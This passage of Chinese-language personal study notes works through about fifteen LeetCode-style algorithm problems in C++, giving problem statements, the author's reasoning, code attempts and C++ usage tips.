continue;\n                    }\n                    node[lengthnext]=node2[i]+j;\n                    node3[node2[i]+j]=1;\n                    if(node[lengthnext]==n-1){\n                        return cnt;\n                    }\n                    lengthnext++;\n                }\n            }\n            length=lengthnext;\n            lengthnext=0;\n            copy(node.begin(), node.begin()+length, node2.begin());\n            }\n        \n        return 1;\n    }\n};\n```\n\n###### 思路二：\n\n看了一下好像和lz的思路一致，只不过不用对要跳的格子数进行遍历，只记录一个范围（好像确实快很多！）\n\n```c++\nint jump(vector<int> &nums)\n{\n    int ans = 0;\n    int start = 0;\n    int end = 1;\n    while (end < nums.size())\n    {\n        int maxPos = 0;\n        for (int i = start; i < end; i++)\n        {\n            // 能跳到最远的距离\n            maxPos = max(maxPos, i + nums[i]);\n        }\n        start = end;      // 下一次起跳点范围开始的格子\n        end = maxPos + 1; // 下一次起跳点范围结束的格子\n        ans++;            // 跳跃次数\n    }\n    return ans;\n}\n```\n\n## 罗马数字转整数(简单)\n\n### 题目描述\n\n罗马数字包含以下七种字符: `I`， `V`， `X`， `L`，`C`，`D` 和 `M`。\n\n```\n字符          数值\nI             1\nV             5\nX             10\nL             50\nC             100\nD             500\nM             1000\n```\n\n例如， 罗马数字 `2` 写做 `II` ，即为两个并列的 1 。`12` 写做 `XII` ，即为 `X` + `II` 。 `27` 写做 `XXVII`, 即为 `XX` + `V` + `II` 。\n\n通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 `IIII`，而是 `IV`。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 `IX`。这个特殊的规则只适用于以下六种情况：\n\n- `I` 可以放在 `V` (5) 和 `X` (10) 的左边，来表示 4 和 9。\n- `X` 可以放在 `L` (50) 和 `C` (100) 的左边，来表示 40 和 90。 \n- `C` 可以放在 `D` (500) 和 `M` (1000) 的左边，来表示 400 和 900。\n\n给定一个罗马数字，将其转换成整数。\n\n### 题解\n\n#### 思路\n\n思路很简单，就是一个一个的比，比到I C X就注意一下\n\n（看到一种更简单的，直接将对应值存在字典里，有两个字符的也一样）\n\n#### 代码\n\n```c++\nclass Solution {\npublic:\n    int romanToInt(string s) {\n        int sum=0;\n        int length=s.size();\n        for(int i=0;i<length;i++){\n            switch(s[i]){\n                case 'M':\n                    sum+=1000;\n                    break;\n                case 'D':\n                    sum+=500;\n                    break;\n                case 'C':\n                    if(i<length-1&&(s[i+1]=='D'||s[i+1]=='M')){\n                        if(s[++i]=='D'){\n                            sum+=400;\n                        }else{\n                            sum+=900;\n                        }\n                    }else{\n                        sum+=100;\n                    }\n                    break;\n                case 'L':\n                    sum+=50;\n                    break;\n                case 'X':\n                    if(i<length-1&&(s[i+1]=='L'||s[i+1]=='C')){\n                        if(s[++i]=='L'){\n                            sum+=40;\n                        }else{\n                            sum+=90;\n                        }\n                    }else{\n                        sum+=10;\n                    }\n                    \n                    break;\n                case 'V':\n                    sum+=5;\n                    break;\n                case 'I':\n                    if(i<length-1&&(s[i+1]=='V'||s[i+1]=='X')){\n                        if(s[++i]=='V'){\n                            sum+=4;\n                        }else{\n                            sum+=9;\n                        }\n                    }else{\n                        sum+=1;\n                    }\n                    break;\n                default:\n                    break;\n            }\n        }\n        return sum;\n    }\n};\n```\n\n## 不同路径（中等）\n\n### 题目描述\n\n一个机器人位于一个 `m x n` 网格的左上角 （起始点在下图中标记为 “Start” ）。\n\n机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。\n\n问总共有多少条不同的路径？\n\n### 思路\n\n#### 思路一：\n\n深度优先，这是lz自己想到的方法但是会超时呜呜呜/(ㄒoㄒ)/~~\n\n#### 思路二：\n\n数学函数排列组合，向右向下的路径长度是知道的，用排列组合，假如到达终点需要向下三格向右六格，最大路径长度就相当于从九个需要的动作里选出两个（不要求顺序），但是由于lz用的c++，该方法会数值会超过限定\n\n#### 思路三\n\n动态规划：到达每一格的最大路径数量其实就是它的左边那一格和上面那一格的最大路径数量之和\n\n我们只需要初始化边上的最大路径长度数量，由于在边缘，最大路径数量肯定是1\n\n```c++\nclass Solution {\npublic:\n    int uniquePaths(int m, int n) {\n        int dp[m][n];\n        for(int i=0;i<m;i++){\n            dp[i][0]=1;\n        }\n        for(int i=0;i<n;i++){\n            dp[0][i]=1;\n        }\n        for(int i=1;i<m;i++){\n            for(int j=1;j<n;j++){\n                dp[i][j]=dp[i][j-1]+dp[i-1][j];\n            }\n        }\n        return dp[m-1][n-1];\n    }\n};\n```\n\n## 两个数组的交集（简单）\n\n给定两个数组 `nums1` 和 `nums2` ，返回 *它们的交集* 。输出结果中的每个元素一定是 **唯一** 的。我们可以 **不考虑输出结果的顺序** 。\n\n### 思路：简单遍历查找\n\n首先对nums1去重，再对nums1的每个元素遍历，用find查找nums2是否有对应项\n\n##### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> intersection(vector<int>& nums1, vector<int>& nums2) {\n        set<int>s(nums1.begin(), nums1.end());\n        nums1.assign(s.begin(), s.end()); \n        vector<int> nums3;\n        for(int i:nums1){\n            if(find(nums2.begin(), nums2.end(), i) != nums2.end()){\n                    nums3.push_back(i);\n            }\n        }\n        return nums3;\n    }\n};\n```\n\n## 反转链表（简单）\n\n### 知识点\n\n普通结构体使用，可以用 **.**     当是用指针指向结构体时，使用->。 \n\neg: (*[node](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)).data的作用等于node->data \n\n它们都是访问node指针所指向的结构体的data成员。*node是node这个地址里存的值，也就是一个结构体对象，所以你可以用点运算符来访问它的成员。而node是这个结构体的地址，所以你可以用箭头运算符来访问它所指向的对象的成员。箭头运算符是一种方便的写法，相当于先对指针进行解引用，然后再用点运算符。\n\n### 思路\n\n就是很简单的一个循环\t\n\npos为当前位置，s指向pos前面一个，q指向pos的next，每次循环的时候让pos->=s;s=pos;pos=q如果这个时候pos为NULL了说明全部数据已经反制了，return s;如果还没有，继续让q=pos->next;\n\n#### 代码\n\n```c++\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode(int x) : val(x), next(NULL) {}\n * };\n */\nclass Solution {\npublic:\n    ListNode* reverseList(ListNode* head) {\n        if(head==NULL){\n            return NULL;\n        }\n        ListNode *s=NULL;\n        ListNode *q=head;\n        ListNode *p=q->next;\n        while(1){\n            q->next=s;\n            s=q;\n            q=p;\n            if(q==NULL){\n                return s;\n            }\n            p=q->next;\n        }\n    }\n};\n```\n\n## 把字符串转换为整数（中等）\n\n### 题目描述\n\n写一个函数 StrToInt，实现把字符串转换成整数这个功能。不能使用 atoi 或者其他类似的库函数。\n\n首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。\n\n当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。\n\n该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。\n\n注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。\n\n在任何情况下，若函数不能进行有效的转换时，请返回 0。\n\n**说明：**\n\n假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231, 231 − 1]。如果数值超过这个范围，请返回  INT_MAX (231 − 1) 或 INT_MIN (−231) 。\n\n### 知识点\n\n1、C++字符数字怎么转换为整数型数字\t\n\n```c++\nchar s='2';\nint num=int(s)-48;\ncout<<num;\n\n\n\n\n输出：2\n```\n\n2、C++没有求幂的运算符，\n\nc++头文件加 #include<math.h>\n使用pow(x,y)，可算出x的y次幂\n\n### 思路\n\n首先获取去除前面的空格，然后比较第一个字符是否为正负号或者在0到九之间，不在就返回零，接着如果有正负号就记录下来，再去除前面的0，将每一个字符转换为数字存在num数组里，如果发现了不为数字的直接跳出循环，我这里就直接让i=length了，接着判断num的长度，大于10直接判定超出了范围，但是等于10的也可能超出范围了，就用longlong定义sum，可以保存更大的值以判断超出范围\n\n```c++\nclass Solution {\npublic:\n    int strToInt(string str) {\n        int length=str.size();\n        int i=0;\n        int fuhao=0;\n        vector<int> num;\n        while(i<length&&str[i]==' '){\n                i++;\n        }\n        if((str[i]!='-'&&str[i]!='+'&&(str[i]<'0'||str[i]>'9'))||i==length){\n            return 0;\n        }\n        if(str[i]=='-'||str[i]=='+'){\n            if(str[i]=='-'){\n                fuhao=1;\n            }\n            i++;\n        }\n        while(i<length&&str[i]=='0'){\n                i++;\n        }\n        if(i==length){\n            return 0;\n        }\n        for(;i<length;i++){\n            if(str[i]>='0'&&str[i]<='9')\n            {\n                num.push_back(int(str[i])-48);\n            }else{\n                i=length;\n            }\n        }\n        length=num.size();\n        if(length>10){\n            if(fuhao==0){\n                return INT_MAX;\n            }else{\n                return INT_MIN;\n            }\n        }\n        long long sum=0;\n        for(auto number : num){\n            sum+=number*pow(10,--length);\n        }\n        if(sum>=2147483648){\n            if(fuhao==0){\n                return INT_MAX;\n            }else{\n                return INT_MIN;\n            }\n        }\n        if(fuhao==0){\n            return sum;\n        }else{\n            return -sum;\n        }\n \n    }\n};\n```\n\n## 替换空格（简单）\n\n### 知识点\n\n1， vector转换为string\n\n```c++\nvector<char> vec { 'A', 'B', 'C' };\n \nstring str(vec.begin(), vec.end());\n```\n\n2, char转换为str\n\n```c++\nchar s='1';\nstring str(1,s);\n```\n\n### 思路\n\n用vector代替string（主要是因为我直接的vector在末尾插入元素的操作QwQ）\n\n后面找到了：\n\nC++ string类有多种在末尾插入字符的函数，其中一种是append函数。这个函数有多个重载版本，可以接受不同类型的参数，比如字符串，字符数组，字符，迭代器等。可以这样使用append函数：\n\n```c++\nstd::string str = \"Hello\";\nstr.append(\" world\"); // 在末尾插入字符串\nstr.append(3, '!'); // 在末尾插入3个字符\nstd::cout << str << std::endl; // 输出Hello world!!!\n```\n\n#### 代码\n\n```c++\nclass Solution {\npublic:\n    string replaceSpace(string s) {\n        vector<char> vec;\n        for(char ss:s){\n            if(ss==' '){\n                vec.push_back('%');\n                vec.push_back('2');\n                vec.push_back('0');\n            }else{\n                vec.push_back(ss);\n            }\n        }\n        string str(vec.begin(), vec.end());\n        return str;\n    }\n};\n```\n\n## 子集（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` ，数组中的元素 **互不相同** 。返回该数组所有可能的子集（幂集）。\n\n解集 **不能** 包含重复的子集。你可以按 **任意顺序** 返回解集。\n\n**示例 1：**\n\n```\n输入：nums = [1,2,3]\n输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]\n```\n\n### 知识点\n\n1. 什么是动态规划：\n\n   动态规划就是把复杂的问题分解为简单的子问题的求解方式。\n\n   动态规划的基本思路：通常用于求解具有某种最优性质的问题，试图只解决每个问题一次一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。动态规划自底向上（迭代而非递归）求解问题，避免重复计算。\n\n   而对于递归，求解这些子问题，然后合并子问题的解得到原问题的解。区别在于这些子问题会有重叠，一个子问题在求解后，可能会再次求解。\n\n   所以，我们可以将这些子问题的解存储起来，不管该子问题以后是否被用到，只要它被计算过，就将其结果填入表中。下次使用时，直接把结果拿来用即可。这就是动态规划法的基本思路。\n\n### 思路\n\nps：这道题感觉是近期做过最舒适的一题了，我采用的是动态规划方法（看了别人的题解才知道自己的方法原来是动态规划QwQ）\n\n我们可以很容易发现一个规律，其实最后的子集求法可以一个一个元素算，比如最开始是空集，在遇到第一个元素1时，在空集的基础上加上1得到1数组，存储空集和1数组，在遇到2时分别在空集和1数组基础上加2，并存在最后的数组的集合中去，以此类推\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<vector<int>> subsets(vector<int>& nums) {\n        vector<vector<int>> ans;\n        vector<int> init;\n        ans.push_back(init);\n        int length;\n        for(int item : nums){\n            length=ans.size();\n            for(int i=0;i<length;i++){\n                auto it=ans[i];\n                it.push_back(item);\n                ans.push_back(it);\n            }\n        }\n        return ans;\n    }\n};\n```\n\n## 最长连续序列（中等）\n\n给定一个未排序的整数数组 `nums` ，找出数字连续的最长序列（不要求序列元素在原数组中连续）的长度。\n\n请你设计并实现时间复杂度为 `O(n)` 的算法解决此问题。\n\n### 知识点\n\n1. 对数组进行排序：\n\n   ```c++\n   vector<int> vec(10);\n   sort(vec.begin(),vec.end());\n   ```\n\n   \n\n2. 去重\n\n   ```c++\n   vec.erase(unique(vec.begin(), vec.end()), vec.end());\n   ```\n\n   \n\n### 思路（两种思路）\n\n偷了个懒，直接去重排序了，等lz有空了就用哈希\n\n2023.09.18:欠的债总是要还的\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int longestConsecutive(vector<int>& nums) {\n        if(nums.size()==0){\n            return 0;\n        }\n        sort(nums.begin(),nums.end());\n        nums.erase(unique(nums.begin(), nums.end()), nums.end());\n        int count=1;\n        int max=1;\n        int pre=nums[0];\n        length=nums.size();\n        for(int i=1;i<length;i++){\n            if(length-i<count){\n                i=length;\n            }else{\n                while(i<length&&nums[i]==pre+1){\n                    pre=nums[i++];\n                    count++;\n                }\n                if(i<length){\n                    pre=nums[i];\n                }\n                if(count>max){\n                    max=count;\n                }\n                count=1;\n            }\n        }\n        return max;\n    }\n};\n```\n\n#### 思路二：哈希\n\n用哈希存储以每个数字为结尾的有序并连续数组的最大长度，首先都初始化为0，然后从头开始遍历，比如遍历的数字是nums[i]，就找nums[i]-1是否存在，如果存在再确定前一个是否存在，找到最前一位，然后将那个值的哈希设为1，依次加一，下次遍历的时候只需要判断是否哈希为0，如果是就说明还没有进行确定最长连续数组，如果不为0就不需要重复运算，lz估测时间复杂度应该为n,因为实际上只是循环了两个数组，第一次遍历，第二次确定每个数字以自己为结尾的最长有序连续数组，不会重复运算\n\n#### 代码二：\n\n```c++\nclass Solution {\npublic:\n    int longestConsecutive(vector<int>& nums) {\n        unordered_map<int,int>hashMap;\n        for(int num:nums){\n            hashMap[num]=0;\n        }\n        int j;\n        int maxCount=0;\n        for(int i=0;i<nums.size();i++){\n            if(hashMap[nums[i]]==0){\n                j=nums[i];\n                while(hashMap.find(--j)!=hashMap.end()){\n                    if(hashMap[j]!=0){\n                        for(int l=j+1;l<=nums[i];l++){\n                            hashMap[l]=hashMap[l-1]+1;\n                        }\n                        break;\n                    }\n                }\n                if(hashMap.find(j)==hashMap.end()){\n                    hashMap[j+1]=1;\n                    for(int l=j+2;l<=nums[i];l++){\n                        hashMap[l]=hashMap[l-1]+1;\n                    }\n                }\n            }\n            maxCount=max(maxCount,hashMap[nums[i]]);\n        }\n        return maxCount;\n    }\n};\n```\n\n\n\n## 最长回文子串（中等）\n\n### 题目描述\n\n给你一个字符串 `s`，找到 `s` 中最长的回文子串。\n\n如果字符串的反序与原始字符串相同，则该字符串称为回文字符串。\n\n### 知识点\n\n1. vector删除指定元素\n\n   ```c++\n   hashmap[i+1].erase(hashmap[i+1].begin() + index);\n   ```\n\n2. string复制部分内容\n\n   ```c++\n   string s=\"abcdef\";\n   string d(begin(s)+2,begin(s)+5);\n   ```\n\n### 思路\n\n**动态规划**\n\n首先给每个键值定义一个数组，该数组将存储该列表所有下标对应的可和右边的组成回文子串的下标，也就是比如下标一可以和下标二组成回文，就存上hash[1]={1,2},初始化每个元素都可以自己组成回文列表\n\n1. 初始化一个二维vector，对应着该下标与某下标可形成回文串，比如vec[1]={1,2,3,4}代表着1位置的该字符可以形成回文子串，1-2两个元素组成的子串可以形成回文，1-3形成的子串可以形成回文\n2. 从右往左遍历元素，对于遍历的每个元素判断是否和左边挨着的那个元素相等（因为等会遍历不到），如果相等，就存在vector中\n3. 接下来遍历左边挨着的那个元素对应可形回文的下标，判断和那个下标右边的值是否相等\n4. 最后遍历所有下标对应的数组，找到最大值，并返回字符串\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    string longestPalindrome(string s) {\n        vector<vector<int>> vec;\n        int max=0;\n        int maxValue;\n        string d;\n        int i;\n        for(i=0;i<s.size();i++){\n            vec.push_back({i});\n        }\n        for(i=s.size()-2;i>=0;i--){\n            if(s[i]==s[i+1]){\n                vec[i].push_back(i+1);\n            }\n            for(int index:vec[i+1]){\n                if(index<s.size()&&s[i]==s[index+1]){\n                    vec[i].push_back(index+1);\n                }\n            }\n        }\n        for(i=0;i<s.size();i++){\n            maxValue = *max_element(vec[i].begin(),vec[i].end()); \n            if(maxValue-i+1>max){\n                d = s.substr(i, maxValue - i + 1);\n                max=maxValue-i;\n            }\n        }\n        return d;\n    }\n};\n```\n\n## 二叉树的最大深度（简单）\n\n### 题目描述\n\n给定一个二叉树 `root` ，返回其最大深度。\n\n二叉树的 **最大深度** 是指从根节点到最远叶子节点的最长路径上的节点数。\n\n### 思路\n\n用递归，很简单的思路，也有点动态规划那意思，就是从根节点开始计算，一直向下延申，直到有NULL出现，如果已经是叶子节点就从该处开始向上加就是该叶子结点的深度，用max找出最大的\n\n### 代码\n\n```c++\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode() : val(0), left(nullptr), right(nullptr) {}\n *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n * };\n */\nclass Solution {\npublic:\n    int maxDepth(TreeNode* root) {\n        if(root==NULL){\n            return 0;\n        }\n        if(root->left==NULL&&root->right==NULL){\n            return 1;\n        }\n        return max(maxDepth(root->right),maxDepth(root->left))+1;        \n    }\n};\n```\n\n## K个一组翻转链表（困难）\n\nps:没错这是一个困难题，但是lz一次就做对了啊啊啊啊好激动好开心o(*￣▽￣*)ブ\n\n### 题目描述\n\n给你链表的头节点 `head` ，每 `k` 个节点一组进行翻转，请你返回修改后的链表。\n\n`k` 是一个正整数，它的值小于或等于链表的长度。如果节点总数不是 `k` 的整数倍，那么请将最后剩余的节点保持原有顺序。\n\n你不能只是单纯的改变节点内部的值，而是需要实际进行节点交换。\n\n### 思路\n\n我最开始的很麻烦的想法是将连续k个隔离出来，然后进行逆转拼接，文字不太好描述，以下图像比较好理解\n\n<img src=\"2023-7-20%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/a93a7e7e9070f88caa288d4cbea010d.jpg\" alt=\"a93a7e7e9070f88caa288d4cbea010d\" style=\"zoom: 50%;\" />\n\n但是这样就很麻烦，因为我需要记录要逆转的前一个节点，最后一个节点挨着的那个节点，感觉思路没问题但是如果有细节没考虑到那就得调试很久，主要主程序会有很多个变量，这让lz很头痛\n\n接着又开始思考，通过画图分析，我想到可以先对要逆转的那一部分全部进行逆转，再以k为单位进行逆转，这样的话整体对象都是一个链表，调试应该会好很多，重点只需要放在以k为单位逆转上，前面的全部逆转相当于k=1，重新写一个函数用来实现该功能，并返回起始节点和末节点方便进行拼接，大概思路如图所示\n\n<img src=\"2023-7-20%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/edc7ca719b306657fb23b363f6770f7.jpg\" alt=\"edc7ca719b306657fb23b363f6770f7\" style=\"zoom:50%;\" />\n\n接下来介绍一下以k为单位逆转的思路\n\n<img src=\"2023-7-20%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/afe4eed47d031e77d9111b7771e06d2.jpg\" alt=\"afe4eed47d031e77d9111b7771e06d2\" style=\"zoom:50%;\" />\n\n### 代码\n\n```c++\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution {\npublic:\n    //对head以k为单位进行逆转\n    vector<ListNode*> reversek(ListNode* head,int k){\n        vector<ListNode*> ans;\n        ListNode * pre=NULL;\n        ListNode * pos=head;\n        ListNode * poss=pos;\n        ListNode * next=head;\n        for(int i=1;i<k;i++){\n            poss=poss->next;\n            next=next->next;\n        }\n        ans.push_back(poss);\n        next=next->next;\n        while(1){\n            poss->next=pre;\n            pre=pos;\n            pos=next;\n            if(pos==NULL){\n                ans.push_back(pre);\n                return ans;\n            }\n            poss=pos;\n            next=pos;\n            for(int i=1;i<k;i++){\n                poss=poss->next;\n                next=next->next;\n            }\n            next=next->next;\n        }\n    } \n    ListNode* reverseKGroup(ListNode* head, int k) {\n        ListNode* headcopy=head;\n        int length=0;\n        while(headcopy){\n            headcopy=headcopy->next;\n            length++;\n        }\n        int re=length/k * k;\n        headcopy=head;\n        while(head&&--re){\n            head=head->next;\n        }\n        vector<ListNode*> ans;\n        ListNode* next=head->next;\n        head->next=NULL;\n        ans=reversek(headcopy,1);\n        ans=reversek(ans[1],k);\n        ans[0]->next=next;\n        return ans[1];\n    }\n};\n```\n\n## 括号生成（中等）\n\n因为赶时间没有细想，看了题解\n\n### 题目描述\n\n数字 `n` 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 **有效的** 括号组合。\n\n### 知识点\n\n1. vector复制\n\n   ```c++\n   vector<int> vec;\n   vec.assign(array.begin(),array.end());//清空原数据，赋予新数据\n   ```\n\n2. vector清空\n\n   ```c++\n   vec.swap(vector<int>())\n   ```\n\n### 思路\n\n我先说说自己最开始的思路吧，也是基于动态规划，就先生成一对括号(),然后i没加一()就再加一对括号，但是我加的方法有问题，我只考虑在旁边加一个(),整体加一个括号，也就是\n\n```c++\nstr1=\"()\"+str;\nstr2=str+\"()\";\nstr3=\"(\"+str+\")\";\n```\n\n但是这样会有问题，如果n=4，那么没办法生成`(())(())`因为一次要么在旁边加要么整体加\n\n看了题解发现了一种更巧妙加括号的方式，还是一样的思路，在原来的基础上加括号，但是不一样的是这次就定了我加的括号的位置，然后往中间填充，因为我们确定第一个字符一定是`(`,那么只需要确定的`)`的位置，所以随后的字符串应该是如下拼接：\n\n```c++\nstr=\"(\"+p+\")\"+q;\n```\n\n那么我们就需要确定p和q，这个只需要对p和q进行遍历，因为我们知道p+q总共需要多少个括号，然后根据该方法从小到大找出字符集\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<string> generateParenthesis(int n) {\n        vector<vector<string>> vecstr;\n        vector<string> str;\n        vecstr.push_back({\"\"});\n        vecstr.push_back({\"()\"});\n        for(int i=2;i<n+1;i++){\n            str.clear();\n            for(int j=0;j<i;j++){\n                for(string p : vecstr[j]){\n                    for(string q: vecstr[i-1-j]){\n                        str.push_back(\"(\"+p+\")\"+q);\n                    }\n                }\n            }\n            vecstr.push_back(str);\n        }\n        return vecstr[n];\n    }\n};\n```\n\n## 组合总和（中等）\n\n没做出来呜呜呜，感觉对深度优先还是不太熟练\n\n### 题目描述\n\n给你一个 **无重复元素** 的整数数组 `candidates` 和一个目标整数 `target` ，找出 `candidates` 中可以使数字和为目标数 `target` 的 所有 **不同组合** ，并以列表形式返回。你可以按 **任意顺序** 返回这些组合。\n\n`candidates` 中的 **同一个** 数字可以 **无限制重复被选取** 。如果至少一个数字的被选数量不同，则两种组合是不同的。 \n\n对于给定的输入，保证和为 `target` 的不同组合数少于 `150` 个。\n\n示例：\n\n```\n输入：candidates = [2,3,6,7], target = 7\n输出：[[2,2,3],[7]]\n解释：\n2 和 3 可以形成一组候选，2 + 2 + 3 = 7 。注意 2 可以使用多次。\n7 也是一个候选， 7 = 7 。\n仅有这两种组合。\n```\n\n### 知识点\n\n1. `vector<vector<int>> combinationSum(vector<int>& candidates, int target)`的&：`&`符号用于传递引用（reference）。在C++中，引用允许你通过引用参数修改函数外部传递给函数的变量，而不是传递变量的副本。\n2. Deque<Integer> path = new ArrayDeque<>();：这行Java代码创建了一个双端队列（Deque），名为`path`，其元素类型为整数（Integer）。在Java中，`Deque`是一种双向队列，可以从队列的前端或后端插入和删除元素，因此它具有栈和队列的功能。\n\n### 思路\n\n使用深度优先遍历的方法，总体思路在下图：\n\n![12159811dcbae957345902cc1a80e0c](2023-7-20%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/12159811dcbae957345902cc1a80e0c.jpg)\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<vector<int>> combinationSum(vector<int>& candidates, int target) {\n        vector<vector<int>>ans;\n        int len=candidates.size();\n        vector<int>path;\n        dfs(candidates,0,len,target,path,ans);\n        return ans;\n    }\n    void dfs(vector<int>candidates,int begin,int len,int target,vector<int>&path,vector<vector<int>>&ans){\n        for(int i=begin;i<len;i++){\n            path.push_back(candidates[i]);\n            if(target>candidates[i]){\n                dfs(candidates,i,len,target-candidates[i],path,ans);\n            }else if(target==candidates[i]){\n                ans.push_back(path);\n            }\n            path.pop_back();\n        }\n    }\n};\n```\n\n## 移动零（简单）\n\n### 题目描述\n\n给定一个数组 `nums`，编写一个函数将所有 `0` 移动到数组的末尾，同时保持非零元素的相对顺序。\n\n**请注意** ，必须在不复制数组的情况下原地对数组进行操作。\n\n### 知识点\n\n1. c++的find会返回列表中该元素的第一个位置\n\n2. 交换两个数：使用c++自带的交换函数\n\n   ```c++\n   swap(a,b);\n   ```\n\n### 思路\n\n#### 思路一\n\n自己想到的解法过于粗糙了：\n\n1. 获取当前数组长度\n2. 删除所有为0的点\n3. 再次获取长度，获取前后长度差补零\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    void moveZeroes(vector<int>& nums) {\n        int length=nums.size();\n        nums.erase(std::remove(nums.begin(),nums.end(),0),nums.end());\n        int lengthth=nums.size();\n        while(length-lengthth++){\n            nums.push_back(0);\n        }\n    }\n};\n```\n\n#### 思路二\n\n准备两个指针：a,b  a负责找不为0的值，一次加一，a找到不为0的值之后将值传给b，b+1，到最后当a找完了，b和a之间的值就换为0\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    void moveZeroes(vector<int>& nums) {\n        int a=0;\n        int b=0;\n        int length=nums.size();\n        while(a<length&&b<length){\n            if(nums[a]!=0){\n                nums[b++]=nums[a];\n            }\n            a++;\n        }\n        for(int i=b;i<length;i++){\n            nums[i]=0;\n        }\n    }\n};\n```\n\n## 接雨水（困难）\n\n没做出来，好难呜呜呜\n\n### 题目描述\n\n给定 `n` 个非负整数表示每个宽度为 `1` 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。\n\n### 思路\n\n#### 思路一：按行求\n\n**会超时**\n\n从最低下一层开始，开始遍历，找到高度大于层数的第一个点，然后记录后面跟着的连续的高度小于层数的个数，直到高度再次大于层数，这两者之间的差就是可以存的水\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int trap(vector<int>& height) {\n        int waterans=0;\n        int tempos=0;\n        int lenth=height.size();\n        int highlevel = *max_element(height.begin(),height.end()); \n        for(int i=1;i<highlevel+1;i++){\n            for(int j=1;j<lenth;j++){\n                if(height[j-1]>=i){\n                    while(j<lenth&&height[j]<i){\n                        j++;\n                        tempos++;\n                    }\n                    if(j!=lenth){\n                        waterans+=tempos;\n                    }\n                    tempos=0;\n                }\n            }\n        }\n        return waterans;\n    }\n};\n```\n\n#### 思路二：按列求\n\n##### 知识点\n\n1. C++ Vector 最大 最小值 索引 位置\n\n   使用STL的Vector时，利用函数 max_element，min_element，distance可以获取Vector中最大、最小值的值和位置索引：\n\n   ```c++\n   int main()\n   {\n       std::vector<double> v {1.0, 2.0, 3.0, 4.0, 5.0, 1.0, 2.0, 3.0, 4.0, 5.0};\n    \n       std::vector<double>::iterator biggest = std::max_element(std::begin(v), std::end(v));\n       std::cout << \"Max element is \" << *biggest<< \" at position \" << std::distance(std::begin(v), biggest) << std::endl;\n    \n       auto smallest = std::min_element(std::begin(v), std::end(v));\n       std::cout << \"min element is \" << *smallest<< \" at position \" << std::distance(std::begin(v), smallest) << std::endl;\n   }\n    \n    \n   输出：\n    \n   Max element is 5 at position 4\n   min element is 1 at position 0</span>\n   ```\n\n##### 思路\n\n遍历数组，遍历位置为index，left记录遍历位置左边最大值索引，right记录遍历位置右边最大值索引，right在right<=index时更新，left在index处值大于left处值时更新，用maxelement+distance找到最大值索引\n\n##### 代码\n\n```c++\nclass Solution {\npublic:\n    int trap(vector<int>& height) {\n        int left=0;\n        int right=0;\n        int index=1;\n        int length=height.size();\n        int water=0;\n        while(index<length-1){\n            if(right<=index){\n                    right=distance(height.begin(),max_element(height.begin()+index+1,height.end()));\n                }\n            if(height[index]<height[left]){\n                if(height[right]-height[index]>0){\n                    water+=min(height[right],height[left])-height[index];\n                }\n            }else{\n                left=index;\n            }\n            index++;\n        }  \n        return water;\n    }\n};\n```\n\n#### 思路三：动态规划\n\n不用每次都求索引右边的最大值，这样时间复杂度会很大，用动态规划的方式求右边的最大值，也就是求出每个下标右边的最大值，从最右边开始算，和左边思路一致\n\n#### 代码三\n\n```c++\nclass Solution {\npublic:\n    int trap(vector<int>& height) {\n        int left=0;\n        int index=1;\n        int length=height.size();\n        int water=0;\n        vector<int> right(length,0);\n        for(int i=length-2;i>=0;i--){\n            right[i]=max(right[i+1],height[i+1]);\n        }\n        while(index<length-1){\n            if(height[index]<height[left]){\n                if(right[index]-height[index]>0){\n                    water+=min(right[index],height[left])-height[index];\n                }\n            }else{\n                left=index;\n            }\n            index++;\n        }  \n        return water;\n    }\n};\n```\n\n#### 